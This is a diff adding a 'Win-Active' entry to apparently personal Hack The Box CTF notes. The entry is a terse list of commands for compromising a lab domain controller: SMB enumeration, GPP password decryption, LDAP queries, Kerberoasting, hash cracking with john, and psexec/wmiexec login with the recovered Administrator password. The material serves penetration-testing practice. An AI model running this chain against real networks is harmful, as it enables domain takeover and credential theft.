@@ -11,6 +11,21 @@ reverse shell - PowerShell
 JuicyPotato
 ```
 
+# Win-Active
+https://0xdf.gitlab.io/2018/12/08/htb-active.html
+```
+enum4linux 10.10.10.100
+smbclient \\\\10.10.10.100\\Replication
+gpp-decrypt
+ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
+cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
+john hashadmin -w=/usr/share/wordlists/rockyou.txt
+./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
+./psexec.py Administrator:Ticketmaster1968@10.10.10.100
+```
+
+
+
 # Win-Search
 https://0xdf.gitlab.io/2022/04/30/htb-search.html
 ```
